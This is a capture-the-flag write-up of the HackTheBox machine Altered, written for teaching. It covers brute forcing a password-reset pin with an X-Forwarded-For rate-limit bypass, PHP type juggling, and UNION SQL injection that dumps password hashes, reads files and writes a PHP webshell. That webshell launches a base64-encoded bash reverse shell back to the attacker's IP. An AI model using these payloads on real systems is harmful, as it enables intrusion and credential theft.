---
title: HTB: Altered
url: https://0xdf.gitlab.io/2022/03/30/htb-altered.html
date: 2022-03-30T09:00:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, hackthebox, htb-altered, uhc, nmap, laravel, php, type-juggling, password-reset, wfuzz, bruteforce, feroxbuster, rate-limit, sqli, sqli-file, sqli-union, burp, burp-repeater, webshell, dirtypipe, cve-2022-0847, pam-wordle, passwd, ghidra, reverse-engineering, htb-ransom
---

![Altered](https://0xdfimages.gitlab.io/img/altered-cover.png)

Altered was another Ultimate Hacking Championship (UHC) box that’s now up on HTB. This one has another Laravel website. This time I’ll abuse the password reset capability, bypassing the rate limiting using HTTP headers to brute force the pin. Once in, I’ll find a endpoint that’s vulnerable to SQL injection, but only after abusing type-juggling to bypass an integrity check. Using that SQL injection, I’ll write a webshell and get a foothold. To get to root, I’ll abuse Dirty Pipe, with a twist. Most of the scripts to exploit Dirty Pipe modify the passwd file, but this box has pam-wordle installed, so you much play a silly game of tech-based Wordle to auth. I’ll show both how to solve this, and how to use a different technique that overwrites a SUID executable. In Beyond Root, I’ll reverse how that latter exploit works.

## Box Info

| Name | [Altered](https://hackthebox.com/machines/altered)  [Altered](https://hackthebox.com/machines/altered) [Play on HackTheBox](https://hackthebox.com/machines/altered) |
| --- | --- |
| Release Date | 30 Mar 2022 |
| Retire Date | 30 Mar 2022 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [ippsec ippsec](https://app.hackthebox.com/users/3769) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.159
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-30 10:27 UTC
Nmap scan report for 10.10.11.159
Host is up (0.021s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.95 seconds
oxdf@hacky$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.159
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-30 10:28 UTC
Nmap scan report for 10.10.11.159
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: UHC March Finals
|_Requested resource was http://10.10.11.159/login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 Focal.

### Website - TCP 80

#### Site

The site presents a login page for the UHC Staff Dashboard:

![image-20220324104543740](https://0xdfimages.gitlab.io/img/image-20220324104543740.png)

Trying admin / admin returns “Invalid Username”:

![image-20220324104558911](https://0xdfimages.gitlab.io/img/image-20220324104558911.png)

Given that it says the page is for UHC qualified players, I’ll want to try with one of their names. There’s a page with the [UHC winners this season](https://www.hackingesports.com.br/team-4?lang=en):

![image-20220324104636225](https://0xdfimages.gitlab.io/img/image-20220324104636225.png)

I’ll try big0us, and now it says invalid password:

![image-20220324104708730](https://0xdfimages.gitlab.io/img/image-20220324104708730.png)

I’ve found a way to validate users.

On a failed login, a “Forgot Password?” button appears. Clicking that leads to `/reset`:

![image-20220324121113762](https://0xdfimages.gitlab.io/img/image-20220324121113762.png)

If I enter a valid username, it says it emailed a pincode to me:

![image-20220324121207291](https://0xdfimages.gitlab.io/img/image-20220324121207291.png)

Guessing a pin shows the form again with an updated message:

![image-20220324121429017](https://0xdfimages.gitlab.io/img/image-20220324121429017.png)

That message indicates that the session cookie is important when submitting the pin.

#### Tech Stack

If I try visiting `/index.php`, it returns a redirect to `/index.php/login`. If I try `index.html`, it returns 404. This is a good indication that the site is running on PHP.

The response headers show NGINX:

```

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-cache, private
Date: Wed, 30 Mar 2022 13:14:29 GMT
Location: http://10.10.11.159/login
Set-Cookie: XSRF-TOKEN=eyJpdiI6IjEvaE5oTjdualQrcG1PcUNodTNwUFE9PSIsInZhbHVlIjoiNFJDVzRJYWRDQVlCY3g5cG43WXM5SjlwLzF6QTFra2RTRVJTOWdnTkNPVC9aL1BhQmE2UVhCUzFKb0xYaXUxcTdMVmhXRFRQNU9UbE9VdmkxOWc5Wm1wRFNhNzFhOEt4NTNoVWQrK0Y4NXpiOTloMW5Zb0hVUnZ4N05NM2lwclgiLCJtYWMiOiI5OWZmNzdjZDdhOWU1OTNjMjczMTFmMmY5NDQzY2FmZDA3YmZhMGI2MGFmODNiMGM5MmRkOGU2NmUxMTc2MDA3IiwidGFnIjoiIn0%3D; expires=Wed, 30-Mar-2022 15:14:29 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6ImNMbzNvcitDclBuQWZSUUNFQnkzZEE9PSIsInZhbHVlIjoieVd0UUNRUlo5d1dwamRJZ3JRV1RFL0RqeHFkOVZ3MnpndE1DVVVCdS9tOHJOdDNVaGFyK1RjMTJkeGU5Ykp3WGtYRFFsT2M0S2gycEJITmYzcUxHcnFtOTZUT01tdWQ5aUQ5MlJPcGlaWWptODhxVjlxUWNoczUvVjVFOW0yd24iLCJtYWMiOiJiNjNkMWUyN2Q4N2ZjYzhkNjkxMjdjNTJlZjY2MGNjMmNkZDdiMDMxOTc1MmQ0ZmVhZGYyYWI1OTg2MGFmMzBmIiwidGFnIjoiIn0%3D; expires=Wed, 30-Mar-2022 15:14:29 GMT; Max-Age=7200; path=/; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 346

...[snip]...

```

There’s also `laravel_session` cookies being set, which is a good indication that the site is PHP and built on the Laravel Framework. I showed a Laravel/PHP type juggling exploit in the previous UHC box, [Ransom](/2022/03/15/htb-ransom.html#bypass-login), and did a deep dive into Laravel in the [Beyond Root section](/2022/03/15/htb-ransom.html#beyond-root) for that post. All of that is worth reading for good Laravel background.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.159 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.159
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       12w      178c http://10.10.11.159/css => http://10.10.11.159/css/
200      GET        1l        3w       11c http://10.10.11.159/test
301      GET        7l       12w      178c http://10.10.11.159/js => http://10.10.11.159/js/
200      GET      140l      315w        0c http://10.10.11.159/login
301      GET        7l       12w      178c http://10.10.11.159/css/lib => http://10.10.11.159/css/lib/
301      GET        7l       12w      178c http://10.10.11.159/js/lib => http://10.10.11.159/js/lib/
301      GET        7l       12w      178c http://10.10.11.159/fonts => http://10.10.11.159/fonts/
302      GET       12l       22w        0c http://10.10.11.159/index.php => http://10.10.11.159/index.php/login
301      GET        7l       12w      178c http://10.10.11.159/js/lib/gmap => http://10.10.11.159/js/lib/gmap/
301      GET        7l       12w      178c http://10.10.11.159/js/init => http://10.10.11.159/js/init/
200      GET      133l      297w        0c http://10.10.11.159/reset
[####################] - 20m   479984/479984  0s      found:11      errors:0      
[####################] - 19m    59998/59998   50/s    http://10.10.11.159 
[####################] - 19m    59998/59998   50/s    http://10.10.11.159/css 
[####################] - 19m    59998/59998   50/s    http://10.10.11.159/js 
[####################] - 19m    59998/59998   50/s    http://10.10.11.159/css/lib 
[####################] - 19m    59998/59998   50/s    http://10.10.11.159/js/lib 
[####################] - 19m    59998/59998   50/s    http://10.10.11.159/fonts 
[####################] - 18m    59998/59998   53/s    http://10.10.11.159/js/lib/gmap 
[####################] - 18m    59998/59998   53/s    http://10.10.11.159/js/init 

```

Nothing interesting there beyond what I already know.

## Shell as www-data

### Access Dashboard

#### Brute Force Pin - Fail

Given the pin is only four digits, I’ll try to brute force it with `wfuzz`. I’ll grab the cookies from my session and add them in. I’ll start this and quickly kill it:

```

oxdf@hacky$ wfuzz -u http://10.10.11.159/api/resettoken \
> -d "name=big0us&pin=FUZZ" \
> -z range,0000-9999 \
> -H "Cookie: XSRF-TOKEN=eyJpdiI6IlZ2R1BUc1JURkdYVWJMNktDeFIwZFE9PSIsInZhbHVlIjoiN3FCSkZ4OHdsZEFqRDc4eEZSbnluM2t2S2FNL1RXa2ZzV2s0OGFRYVBOSFp6clhYWnRpRUZXUTFHdSs0dE1JVm5YYm92Z2xKQUpxRzdlOUlvTU9YRDcySXdhMDZZNVYwQWlHd0hXTXByUDNTZjZMMFFobXJ6VGRvdFNVWTNmOUYiLCJtYWMiOiIxYmEwYWNmYjJhNjdiY2I2YzMzZDVmNWJiZTk2MDAxZGU4Y2U0ZDU3MGJhNGVmMThjN2FmNDllNDQwNTk3YTNkIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ilg0ckV2cEkzWFQwUmFLR0ZvRldPa2c9PSIsInZhbHVlIjoiWHdmOW1BVTlHTk11bEdJOGxhRVdZbjlKR25BbEo1S1ROSTNZYjFWblFuR0dnREl0WTIzRkE3WklzcUtNN2JjelQ3UytoazU5UmxoM0Zyc3ZxTW1ROS9vdzdMQXdQdVlSSUFUV0pPTTFBSmZaSS82RloxYkJUbWlCQ2lPaWJjMjUiLCJtYWMiOiJhMDJjNDkyMWVhYjc0MTI1ZTZmOTMxNTE2YTYzZWFjNjVjYzMwYzYwNTdiOTgyM2I5NjZjNmZiZWQ1OGM4OWRlIiwidGFnIjoiIn0%3D" \
> --hh 5341 \
> -w ips \
> -H "X-Originating-IP: FUZ2Z" \
> -m zip
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.159/api/resettoken
Total requests: 10000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000003:   200        140 L    324 W    5645 Ch     "0002 - 10.10.0.2"
000000005:   200        140 L    324 W    5645 Ch     "0004 - 10.10.0.4"
000000006:   200        140 L    324 W    5645 Ch     "0005 - 10.10.0.5"
000000004:   200        140 L    324 W    5645 Ch     "0003 - 10.10.0.3"
000000007:   200        140 L    324 W    5645 Ch     "0006 - 10.10.0.6"
000000001:   200        140 L    324 W    5645 Ch     "0000 - 10.10.0.0"
000000008:   200        140 L    324 W    5645 Ch     "0007 - 10.10.0.7"
000000009:   200        140 L    324 W    5645 Ch     "0008 - 10.10.0.8"
000000002:   200        140 L    324 W    5645 Ch     "0001 - 10.10.0.1"
000000010:   200        140 L    324 W    5645 Ch     "0009 - 10.10.0.9"
000000011:   200        140 L    324 W    5645 Ch     "0010 - 10.10.0.10"
000000012:   200        140 L    324 W    5645 Ch     "0011 - 10.10.0.11"
^C
Finishing pending requests...

```

Looks like I need to hide the default case of 5645 characters. I’ll add `--hh 5645`. But there’s an issue that comes up. After about 60 requests, the response changes lengths, and becomes 429:

```

oxdf@hacky$ wfuzz -u http://10.10.11.159/api/resettoken -d "name=big0us&pin=FUZZ" -z range,0000-9999 -H 'Cookie: XSRF-TOKEN=eyJpdiI6ImU3NEtGZUtKOGk5YWJTTFllWEtJRnc9PSIsInZh
bHVlIjoibFZweDd4RVprZVp3ME9xbXZ4M2ZYbktDaEZGVkptVDlYUlVrUFlENkkvYjRlNVNXcXR4Q0NGa3hMNFhtUlRyUHU3cFR4YnFSWHM0RzdPSE12V0F2SjBMQzRzTmRsSHRUd0dObGc4QUxodVNsRFcveXROclFoQTQ1WndEZmdsK1EiLCJtYWMiOiIzMTgwODUyYTcwNTVjYjU
xZDI5YTNmNTMzM2NkNWQ5ODY3OTg5Y2Q1NWY3NTE4MWFkYzY1MzNiMmMyOGY4N2VmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Iitla3R1Y0JVZTY0T1crTVZGSjkxeWc9PSIsInZhbHVlIjoiSXZMUVg4NXljbFliL3BwV2phYnJIQTRscVhWbU9wcE5QRGZmcmpQWj
BIOGtVd3ZZOFpUSVhGRkRWRzBXMTVUM2VRUzRRSzZpclBZcW1IUmtyanQ3OVg4eG1JamdLYW16d0RNdkZFWnphK1krTTJZUTJ2YUxGMXBmbzFoUnBISnciLCJtYWMiOiI5OTVhMmQ2NDFiNzg1NDNlYTRkZTdmN2ZkNDY5OWMyOWVjYzEwNTdmMmM1NTE2OWNiMjk3MGI2ODE3ODFlY
TdlIiwidGFnIjoiIn0%3D' --hh 5645
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.159/api/resettoken
Total requests: 10000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000061:   429        36 L     125 W    6625 Ch     "0060"
000000063:   429        36 L     125 W    6625 Ch     "0062"
000000064:   429        36 L     125 W    6625 Ch     "0063"
000000062:   429        36 L     125 W    6625 Ch     "0061"
000000065:   429        36 L     125 W    6625 Ch     "0064"
000000066:   429        36 L     125 W    6625 Ch     "0065"
...[snip]...

```

If I submit one manually now, it returns 429:

![image-20220324124853028](https://0xdfimages.gitlab.io/img/image-20220324124853028.png)

#### Rate-Limit Bypass

HackTricks has a page on [rate-limit bypass](https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass), and one of the suggestions is to play with HTTP headers to trick the server into logging each request to a different IP. I need 10,000 different IPs (I could probably get away with 10,000 / 60, but I need 10,000 lines in the file I’m about to generate, so might as well make them unique). I’ll generate a file with enough IPs:

```

oxdf@hacky$ for i in {0..50}; do
> for j in {0..250}; do
>   echo "10.10.$i.$j";
> done; 
> done > ips
oxdf@hacky$ wc -l ips 
12801 ips
oxdf@hacky$ head ips
10.10.0.0
10.10.0.1
10.10.0.2
10.10.0.3
10.10.0.4
10.10.0.5
10.10.0.6
10.10.0.7
10.10.0.8
10.10.0.9

```

Now I’ll run the same `wfuzz` from before, but this time pass in the additional list, and use a second `FUZ2Z` parameter to show where to put it. I’m using `-m zip` to combine the two lists together. By default, with two fuzzes, it would try every combination. So for [a, b] and [c, d], it would try ac, ad, bc, bd. This is called product. By changing the method to zip, it will only pair things based on position in the list. So from the example above, it will try ac and bd. That makes sense here since I want a different IP for each number, not trying each number with each IP.

It fails with `X-Originating-IP`:

```

oxdf@hacky$ wfuzz -u http://10.10.11.159/api/resettoken \
> -d "name=big0us&pin=FUZZ" \
> -z range,0000-9999 \
> -H 'Cookie: XSRF-TOKEN=eyJpdiI6ImU3NEtGZUtKOGk5YWJTTFllWEtJRnc9PSIsInZhbHVlIjoibFZweDd4RVprZVp3ME9xbXZ4M2ZYbktDaEZGVkptVDlYUlVrUFlENkkvYjRlNVNXcXR4Q0NGa3hMNFhtUlRyUHU3cFR4YnFSWHM0RzdPSE12V0F2SjBMQzRzTmRsSHRUd0
dObGc4QUxodVNsRFcveXROclFoQTQ1WndEZmdsK1EiLCJtYWMiOiIzMTgwODUyYTcwNTVjYjUxZDI5YTNmNTMzM2NkNWQ5ODY3OTg5Y2Q1NWY3NTE4MWFkYzY1MzNiMmMyOGY4N2VmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Iitla3R1Y0JVZTY0T1crTVZGSjkxe
Wc9PSIsInZhbHVlIjoiSXZMUVg4NXljbFliL3BwV2phYnJIQTRscVhWbU9wcE5QRGZmcmpQWjBIOGtVd3ZZOFpUSVhGRkRWRzBXMTVUM2VRUzRRSzZpclBZcW1IUmtyanQ3OVg4eG1JamdLYW16d0RNdkZFWnphK1krTTJZUTJ2YUxGMXBmbzFoUnBISnciLCJtYWMiOiI5OTVhMmQ2
NDFiNzg1NDNlYTRkZTdmN2ZkNDY5OWMyOWVjYzEwNTdmMmM1NTE2OWNiMjk3MGI2ODE3ODFlYTdlIiwidGFnIjoiIn0%3D' \
> --hh 5645 \
> -w ips \
> -H "X-Originating-IP: FUZ2Z" \
> -m zip
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.159/api/resettoken
Total requests: 10000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000061:   429        36 L     125 W    6625 Ch     "0000 - 10.10.0.60"
000000064:   429        36 L     125 W    6625 Ch     "0000 - 10.10.0.63"
000000062:   429        36 L     125 W    6625 Ch     "0000 - 10.10.0.61"
000000063:   429        36 L     125 W    6625 Ch     "0000 - 10.10.0.62"
...[snip]...

```

When I switch that to the second header on the HackTricks list, `X-Forwarded-For`, it works:

```

oxdf@hacky$ wfuzz -u http://10.10.11.159/api/resettoken -d "name=big0us&pin=FUZZ" -z range,0000-9999 -H "Cookie: XSRF-TOKEN=eyJpdiI6IlZ2R1BUc1JURkdYVWJMNktDeFIwZFE9PSIsInZhbHVlIjoiN3FCSkZ4OHdsZEFqRDc4eEZSbnluM2t2S2FNL1RXa2ZzV2s0OGFRYVBOSFp6clhYWnRpRUZXUTFHdSs0dE1JVm5YYm92Z2xKQUpxRzdlOUlvTU9YRDcySXdhMDZZNVYwQWlHd0hXTXByUDNTZjZMMFFobXJ6VGRvdFNVWTNmOUYiLCJtYWMiOiIxYmEwYWNmYjJhNjdiY2I2YzMzZDVmNWJiZTk2MDAxZGU4Y2U0ZDU3MGJhNGVmMThjN2FmNDllNDQwNTk3YTNkIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ilg0ckV2cEkzWFQwUmFLR0ZvRldPa2c9PSIsInZhbHVlIjoiWHdmOW1BVTlHTk11bEdJOGxhRVdZbjlKR25BbEo1S1ROSTNZYjFWblFuR0dnREl0WTIzRkE3WklzcUtNN2JjelQ3UytoazU5UmxoM0Zyc3ZxTW1ROS9vdzdMQXdQdVlSSUFUV0pPTTFBSmZaSS82RloxYkJUbWlCQ2lPaWJjMjUiLCJtYWMiOiJhMDJjNDkyMWVhYjc0MTI1ZTZmOTMxNTE2YTYzZWFjNjVjYzMwYzYwNTdiOTgyM2I5NjZjNmZiZWQ1OGM4OWRlIiwidGFnIjoiIn0%3D" --hh 5645 -w ips -H "X-Forwarded-For: FUZ2Z" -m zip
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.159/api/resettoken
Total requests: 10000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000001478:   200        138 L    303 W    5366 Ch     "1477 - 10.10.5.222"

Total time: 206.5825
Processed Requests: 10000
Filtered Requests: 9999
Requests/sec.: 48.40680

```

About a minute later I have a pin that returns a different length.

#### Change Password

When I enter that pin into `/reset`, it shows a new form:

![image-20220324130214509](https://0xdfimages.gitlab.io/img/image-20220324130214509.png)

I’ll change it to something I know, and then log in, and it works.

### Bypass Secret Check

#### Authenticated Enumeration

Once logged in, there’s a simple table with a list of winners, their name, country, and a link to a profile:

![image-20220324134608575](https://0xdfimages.gitlab.io/img/image-20220324134608575.png)

Hovering over each link just shows it targeting the page:

![image-20220324135221436](https://0xdfimages.gitlab.io/img/image-20220324135221436.png)

Clicking on one does pop a new section with some text:

![image-20220324135324640](https://0xdfimages.gitlab.io/img/image-20220324135324640.png)

Looking in the Firefox dev tools, there is Javascript that handles the the “on-click” action, each `<a>` tag is hardcoded with an `onclick` that handles the click with JavaScript. For example:

```

<a href="#" id="GetBio" onclick="getBio( '1', '89cb389c73f667c5511ce169033089cb' );">View</a>

```

Each link is hardcoded with a different second parameter.

The `getBio` script is inline in the page at the top:

```

    function getBio(id,secret) {
        $.ajax({
            type: "GET",
            url: 'api/getprofile',
            data: {
                id: id,
                secret: secret
            },
            success: function(data)
            {
                document.getElementById('alert').style.visibility = 'visible';
                document.getElementById('alert').innerHTML = data;
            }

        });
    }

```

It makes an HTTP request over AJAX to `/api/getprofile` passing the id and secret.

#### Enumerating Secrets

Looking in Burp confirms that each link sends a different id and secret to the server:

![image-20220324140722475](https://0xdfimages.gitlab.io/img/image-20220324140722475.png)

The `secret` seems to be the same for a given `id`. The secret looks like an MD5 hash, but some quick testing in a console shows it isn’t just a hash of the id. Most likely they are appending or prepending a secret value to the id and hashing that.

If I send one of the requests to Burp Repeater and try modifying the secret, it returns an error message:

[![image-20220324140954627](https://0xdfimages.gitlab.io/img/image-20220324140954627.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220324140954627.png)

#### Bypassing Secret With Type Juggling

In [Ransom](/2022/03/15/htb-ransom.html#bypass-login), a previous UHC box, there was a Laravel application where the authentication could be bypassed using type juggling. I can try the same attack here. If I change the above request to a POST, the site returns 405 Method Not Allowed. I’ll try the same trick, sending JSON data in the body of a GET request. With the legit secret, the response comes back:

[![image-20220324141426943](https://0xdfimages.gitlab.io/img/image-20220324141426943.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220324141426943.png)

If I think about the code on the server, I expect it to take the id, prepend or append some extra data, and take a hash, and then compare that hash to `secret`. If that comparison is done with `==` and not `===`, type juggling would bypass the check. I’ll try changing `secret` to `true`, and it works:

[![image-20220324141559087](https://0xdfimages.gitlab.io/img/image-20220324141559087.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220324141559087.png)

This query also works with the `id` as a string instead of an int:

![image-20220324142618277](https://0xdfimages.gitlab.io/img/image-20220324142618277.png)

This is important because if I send in something like a SQL injection payload, it can’t go in an integer field, but it fits fine into a string.

### SQL Injection

#### Identify

To test for SQL injection, I’ll start with a simply `"1'"` to see if it crashes. It does:

[![image-20220324142916229](https://0xdfimages.gitlab.io/img/image-20220324142916229.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220324142916229.png)

That’s a good indication that I’m injecting into a SQL statement.

If I send `"12"` as a payload, it returns 500 as well. Presumably that’s because there is no `id` in the DB, and the site isn’t handling that well (assuming that since no one has the `secret` for 12, it can’t be requested).

If I change that to `"12 or 1=1;-- -"`, then it works again:

[![image-20220324143136167](https://0xdfimages.gitlab.io/img/image-20220324143136167.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220324143136167.png)

What this tells me is that the query probably looks like:

```

SELECT profile from users where id = [input];

```

And then later it’s using the first result.

#### Enumerate DB

Interestingly, `sqlmap` doesn’t seem to work with a GET request with parameters in the body. If anyone does get this to work, I’d love to see it! Still, it’s not hard to do manually. I’ll start by getting a feel for how many columns there are, and which ones are displayed back by adding `union select 1`, then `union select 1,2`, then `union select 1,2,3`, etc. Only when my added `select` statement has the same number of columns as the query it’s injected into will it return. It looks like there are three columns:

[![image-20220324173430446](https://0xdfimages.gitlab.io/img/image-20220324173430446.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220324173430446.png)

I can replace `3` with things I want to query. I’ll start by getting a list of the databases:

[![image-20220324173515450](https://0xdfimages.gitlab.io/img/image-20220324173515450.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220324173515450.png)

Of all of those, only `uhc` is custom. I’ll focus there. I’ll list the tables and columns with:

```

{"id":"0 union select 1,2,group_concat(concat('\n', table_name, ':', column_name)) from information_schema.columns where table_schema = 'uhc';-- -", "secret":true}

```

This returns a fair number of columns:

```

failed_jobs:id,
failed_jobs:uuid,
failed_jobs:connection,
failed_jobs:queue,
failed_jobs:payload,
failed_jobs:exception,
failed_jobs:failed_at,
migrations:id,
migrations:migration,
migrations:batch,
password_resets:email,
password_resets:token,
password_resets:created_at,
personal_access_tokens:id,
personal_access_tokens:tokenable_type,
personal_access_tokens:tokenable_id,
personal_access_tokens:name,
personal_access_tokens:token,
personal_access_tokens:abilities,
personal_access_tokens:last_used_at,
personal_access_tokens:created_at,
personal_access_tokens:updated_at,
tasks:id,
tasks:title,
tasks:description,
tasks:progress,
tasks:status,
tasks:owner,
tasks:created_at,
tasks:updated_at,
users:id,
users:name,
users:email,
users:country,
users:bio,
users:email_verified_at,
users:password,
users:remember_token,
users:created_at,
users:updated_at

```

I can dump the users and passwords with:

```

{"id":"0 union select 1,2,group_concat(concat('\n', name, ':', password)) from users;-- -", "secret":true}

```

It returns:

```

big0us:$2y$10$Cuf2DxXbrTQSKYWL6n3Kbeqq6TaZ3KCgISO8FdGpsNZ5aEa6lSx6G,
celesian:$2y$10$8ewqN3lE9iazbo8sFiwUleeNIbOpAMRcaMzeiXJ50wlItN2Kd5pI6,
luska:$2y$10$KdZCbzxXRsBOBHI.91XIz.O.lQQ3TqeY8uonzAumoAv6v9JVQv3g.,
tinyb0y:$2y$10$X501zxcWLKXf.OteOaPILuhMBIalFjid5bBjBkrst/cynKL/DLfiS,
o-tafe:$2y$10$XIrsc.ma/p0qhvWm9.sqyOnA5184ICWNverXQVLQJD30nCw7.PyxW,
watchdog:$2y$10$RTbD7i5I53rofpAfr83YcOK2XsTglO01jVHZajEOSH1tGXiU8nzEq,
mydonut:$2y$10$7DFlqs/eXGm0JPVebpPheuEx3gXPhTnRmN1Ia5wutECZg1El7cVJK,
bee:$2y$10$Furn1Q0Oy8IbeCslv7.Oy.psgPoCH2ds3FZfJeQlCdxJ0WVhLKmzm

```

Still, this isn’t useful. I’ve already seen that any player can change any of these, so it seems unlikely that a real password that’ll be useful to me is in there.

I could also mess with password reset tokens, but it doesn’t buy me much I don’t already have.

#### File Read

Another thing I can do with a SQL injection is try to read files. To make sure I have the syntax correct, I’ll start with `/etc/passwd` using `load_file`:

[![image-20220324192434003](https://0xdfimages.gitlab.io/img/image-20220324192434003.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220324192434003.png)

To check out where the website is hosted, I’ll look for a config file for NGINX. The location for these is in `/etc/nginx/sites-enabled/`. Every file in this directory is parsed as a site config, so I’ll have to get lucky and hope Altered used the default name, `default`. It’s there:

[![image-20220324192622717](https://0xdfimages.gitlab.io/img/image-20220324192622717.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220324192622717.png)

It’s a pretty standard config. I’ll note the location I’ve boxed in blue. The web root is in `/srv/altered/public` (which is actually the location suggested in the [Laravel docs](https://laravel.com/docs/9.x/deployment)).

I can read the source, like `index.php`:

[![image-20220324215821565](https://0xdfimages.gitlab.io/img/image-20220324215821565.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220324215821565.png)

But there’s not much that’ll help me.

#### File Write

Given that I can read, I can also try to write a file. Sending this payload will result in a 500 error from the server:

```

{"id":"0 union select 1,2,'test' into outfile '/srv/altered/public/0xdf';-- -", "secret":true}

```

Still, after doing so:

```

oxdf@hacky$ curl http://10.10.11.159/0xdf
1       2       test

```

I can also write PHP files that will be executed. For example, sending:

```

{"id":"0 union select 1,2,'<?php phpinfo(); ?>' into outfile '/srv/altered/public/0xdf-info.php';-- -", "secret":true}

```

Generates:

![image-20220324220350820](https://0xdfimages.gitlab.io/img/image-20220324220350820.png)

That’s the output of the `phpinfo()` function!

### Shell

To get a shell, I’ll write a simple PHP script that creates a reverse shell. To avoid nested quote marks, I’ll create a reverse shell and base64-encode it:

```

oxdf@hacky$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'" | base64 
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxJwo=

```

I’ll write the following file:

```

{"id":"0 union select 1,2,'<?php system(base64_decode(\"YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxJwo=\")); ?>' into outfile '/srv/altered/public/shell.php';-- -", "secret":true}

```

Then on visiting `/shell.php`, there’s a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.159 38142
bash: cannot set terminal process group (844): Inappropriate ioctl for device
bash: no job control in this shell
www-data@altered:/srv/altered/public$

```

Upgrade my shell with `script`:

```

www-data@altered:/srv/altered/public$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@altered:/srv/altered/public$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@altered:/srv/altered/public$

```

And grab `user.txt` from the only user home directory on the box:

```

www-data@altered:/home/htb$ cat user.txt
5e82b60a************************

```

## Shell as root

### Enumeration

`uname -a` shows that the kernel is from January, about 2.5 months ago:

```

www-data@altered:/srv/altered/public$ uname -a
Linux altered 5.16.0-051600-generic #202201092355 SMP PREEMPT Mon Jan 10 00:21:11 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

```

There was a major kernel vulnerability, CVE-2022-0847 or [Dirty Pipe](https://dirtypipe.cm4all.com/), which was patched in March, for kernels 5.16.11, 5.15.25, and 5.10.102. This box is running 5.16.0, and therefore should be vulnerable.

### Dirty Pipe Background

Dirty Pipe (CVE-2022-0847) became public in early March 2022, with a detailed [blog post](https://dirtypipe.cm4all.com/) from Max Kellermann. The post has great detail about how it works.

